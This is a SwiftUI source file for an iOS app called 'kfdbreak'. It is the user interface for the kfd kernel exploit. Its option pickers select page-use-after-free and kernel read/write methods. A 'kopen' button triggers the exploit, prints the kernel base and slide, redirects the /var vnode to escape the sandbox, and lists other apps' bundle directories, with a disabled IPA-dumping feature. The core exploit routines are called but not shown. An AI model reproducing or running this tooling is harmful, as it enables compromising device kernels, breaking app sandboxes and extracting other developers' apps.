/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

import SwiftUI

func makeCString(from str: String) -> UnsafeMutablePointer<Int8> {
    let count = str.utf8.count + 1
    let result = UnsafeMutablePointer<Int8>.allocate(capacity: count)
    str.withCString { (baseAddress) in
        // func initialize(from: UnsafePointer<Pointee>, count: Int)
        result.initialize(from: baseAddress, count: count)
    }
    return result
}

struct ContentView: View {
    @Binding var output: String
    init(output: Binding<String>) {
        self._output = output
    }
    
    @State private var kfd: UInt64 = 0
    @State private var kernel_slide: UInt64 = 0

    private var puaf_pages_options = [16, 32, 64, 128, 256, 512, 1024, 2048]
    @State private var puaf_pages_index = 7
    @State private var puaf_pages = 0

    private var puaf_method_options = ["physpuppet", "smith"]
    @State private var puaf_method = 1

    private var kread_method_options = ["kqueue_workloop_ctl", "sem_open"]
    @State private var kread_method = 1

    private var kwrite_method_options = ["dup", "sem_open"]
    @State private var kwrite_method = 1
    
    private var base_path = "/var"
    @State private var current_directory_path = "/var"
    @State private var current_directory_mount_path = ""
    @State private var real_directory_mount_path = ""
    @State private var current_directory_entries = ["(empty)"]
    
    @State private var ipa_entries = ["(empty)"]
    
    @State private var progress_visible = false
    @State private var status_text = "obtaining kernel read/write"
    @State private var progress = 0.0
    
    func printOutput(string: String) {
        print(string)
        output.append(string + "\n")
    }
    
    func updateDirectoryListing(pathname: String) {
        if (pathname.starts(with: base_path)) {
            var isDirectory: ObjCBool = true
            if (FileManager.default.fileExists(atPath: real_directory_mount_path + pathname.replacingOccurrences(of: base_path, with: "", options: .literal, range: pathname.range(of: base_path) ?? pathname.startIndex..<pathname.endIndex), isDirectory: &isDirectory)) {
                if (isDirectory.boolValue) {
                    current_directory_path = pathname
                    
                    let currentDirectoryCString = makeCString(from: current_directory_path)
                    let mnt = mountVnode(getVnodeAtPathByChdir(currentDirectoryCString), currentDirectoryCString)
                    let dirs = try? FileManager.default.contentsOfDirectory(atPath: String(cString: mnt!))
                    
                    current_directory_mount_path = String(cString: mnt!)
                    current_directory_entries = [".."] + dirs!
                }
            } else {
                current_directory_entries = ["..", "(empty)"]
            }
        } else {
            current_directory_entries = ["..", "(empty)"]
        }
    }

    var body: some View {
        NavigationView {
            Form {
                
                /*
                if progress_visible {
                    VStack(alignment: .leading, spacing: 6) {
                        Text(status_text)
                        ProgressView(value: progress, total: 100)
                    }
                }
                */
                
                Section {
                    Picker(selection: $puaf_pages_index, label: Text("puaf pages:")) {
                        ForEach(0 ..< puaf_pages_options.count, id: \.self) {
                            Text(String(self.puaf_pages_options[$0]))
                        }
                    }.disabled(kfd != 0)
                    Picker(selection: $puaf_method, label: Text("puaf method:")) {
                        ForEach(0 ..< puaf_method_options.count, id: \.self) {
                            Text(self.puaf_method_options[$0])
                        }
                    }.disabled(kfd != 0)
                    Picker(selection: $kread_method, label: Text("kread method:")) {
                        ForEach(0 ..< kread_method_options.count, id: \.self) {
                            Text(self.kread_method_options[$0])
                        }
                    }.disabled(kfd != 0)
                    Picker(selection: $kwrite_method, label: Text("kwrite method:")) {
                        ForEach(0 ..< kwrite_method_options.count, id: \.self) {
                            Text(self.kwrite_method_options[$0])
                        }
                    }.disabled(kfd != 0)
                } header: {
                    Text("Exploit Options")
                }
                
                ScrollViewReader { proxy in
                    ScrollView {
                        Text(output)
                            .id(1)
                            .font(Font.custom("JetBrains Mono", size: 14))
                            .padding(EdgeInsets(top: 6, leading: 0, bottom: 6, trailing: 0))
                            .fixedSize(horizontal: false, vertical: true)
                    }.frame(minHeight: 16, maxHeight: 256, alignment: .topLeading).onChange(of: output) { _ in
                        proxy.scrollTo(1, anchor: .bottom)
                    }
                }
                
                Section {
                    HStack {
                        Button("kopen") {
                            progress_visible = true
                            status_text = "obtaining kernel read/write"
                            progress = (100 / 8) * 1
                            
                            printOutput(string: "[*] attempting kopen...")
                            
                            DispatchQueue.main.asyncAfter(deadline: .now() + 1) {
                                puaf_pages = puaf_pages_options[puaf_pages_index]
                                kfd = do_kopen(UInt64(puaf_pages), UInt64(puaf_method), UInt64(kread_method), UInt64(kwrite_method))
                                kernel_slide = get_kslide()
                                
                                printOutput(string: String(format:"[*] kfd -> 0x%llx", kfd))
                                printOutput(string: String(format:"[*] kernel base -> 0x%llx", 0xfffffff007004000 + kernel_slide))
                                printOutput(string: String(format:"[*] kernel slide -> 0x%llx", kernel_slide))
                                
                                status_text = "redirecting /var vnode to sandbox"
                                progress = (100 / 8) * 2
                                
                                do_fun()
                                
                                status_text = "patchfinding"
                                progress = (100 / 8) * 3
                        
                                
                                /* filemanager
                                
                                let basePathCString = makeCString(from: base_path)
                                let mnt = mountVnode(getVnodeAtPathByChdir(basePathCString), basePathCString)
                                let dirs = try? FileManager.default.contentsOfDirectory(atPath: String(cString: mnt!))
                                
                                real_directory_mount_path = String(cString: mnt!)
                                current_directory_mount_path = String(cString: mnt!)
                                current_directory_entries = [".."] + dirs!
                                 
                                */
                                
                                let ipaPathCString = makeCString(from: "/var/containers/Bundle/Application")
                                let ipaMnt = mountVnode(getVnodeAtPathByChdir(ipaPathCString), ipaPathCString)
                                let ipaDirs = try? FileManager.default.contentsOfDirectory(atPath: String(cString: ipaMnt!))
                                
                                ipa_entries = ipaDirs!
                            }
                        }.disabled(kfd != 0).frame(minWidth: 0, maxWidth: .infinity)
                        Button("kclose") {
                            do_kclose()
                            puaf_pages = 0
                            kfd = 0
                            current_directory_entries = ["(empty)"]
                            progress_visible = false
                            progress = 0
                        }.disabled(kfd == 0).frame(minWidth: 0, maxWidth: .infinity)
                    }.buttonStyle(.bordered)
                }.listRowBackground(Color.clear)
                
                /*
                if kfd != 0 {
                    Section {
                        VStack {
                            Text("Success!").foregroundColor(.green)
                            Text("Look at output in Xcode")
                        }.frame(minWidth: 0, maxWidth: .infinity)
                    }.listRowBackground(Color.clear)
                    
                    Section {
                        List {
                            ForEach(0 ..< current_directory_entries.count, id: \.self) { entry in
                                Text(self.current_directory_entries[entry])
                                    .contentShape(Rectangle())
                                    .onTapGesture(perform: {
                                        let pathname = current_directory_entries[entry]
                                        if (pathname == "..") {
                                            updateDirectoryListing(pathname: current_directory_path.prefix(upTo: current_directory_path.lastIndex(of: "/") ?? current_directory_path.endIndex).description)
                                        } else if (pathname == "(empty)") {} else {
                                            updateDirectoryListing(pathname: current_directory_path + "/" + pathname)
                                        }
                                    })
                            }
                        }
                    } header: {
                        Text("Directory listing of \(current_directory_path)")
                    }
                    
                    Section {
                        List {
                            ForEach(0 ..< ipa_entries.count, id: \.self) { entry in
                                Text(self.ipa_entries[entry])
                                    .contentShape(Rectangle())
                                    .onTapGesture(perform: {
                                        let ipaPathCString = makeCString(from: "/var/containers/Bundle/Application/\(self.ipa_entries[entry])")
                                        let ipaMnt = mountVnode(getVnodeAtPathByChdir(ipaPathCString), ipaPathCString)
                                        let ipaDirs = try? FileManager.default.contentsOfDirectory(atPath: String(cString: ipaMnt!))
                                        
                                        let app = ipaDirs!.first { entry in
                                            entry.hasSuffix(".app")
                                        }
                                        
                                        print("[i] app: ", app!)
                                    })
                            }
                        }
                    } header: {
                        Text("Dump IPAs")
                    }
                }
                */
            }.navigationBarTitle(Text("kfdbreak"), displayMode: .inline)
        }
    }
}
